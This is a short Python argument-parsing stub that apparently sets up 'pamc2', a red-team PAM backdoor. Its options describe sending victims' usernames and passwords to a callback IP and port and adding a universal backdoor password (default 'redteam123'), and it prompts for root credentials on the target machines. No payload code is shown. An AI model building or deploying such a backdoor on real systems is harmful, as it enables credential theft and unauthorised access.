#!/usr/bin/python3
import os
import argparse

def setup_cmd_args():
    parser = argparse.ArgumentParser(description="Script to setup pamc2 for use on this machine")
    parser.add_argument('-i', '--ip', metavar="<Callback IP Address>",
                        required=True, dest="ip", action="store")
    parser.add_argument('-p', '--port', metavar="<Callback Port>",
                        required=True, dest="port", action="store")
    parser.add_argument('-f', '--format', metavar="<Format String>",
                        dest="format", help="Format string for socket messages (MUST HAVE 4 %s's (ip, message, username, password)); Default: '%s - %s %s:%s")
    parser.add_argument('--password', metavar="<Backdoor Password>",
                        dest="password", help="Backdoor password to gain access to any user; Default: redteam123")
    return parser.parse_args()

def main():
    args = setup_cmd_args()

    ansible_user = input("Enter username of user with root access on the target machines: ")
    ansible_password = input("Enter password of this user: ")

    


if (__name__ == '__main__'):
    main()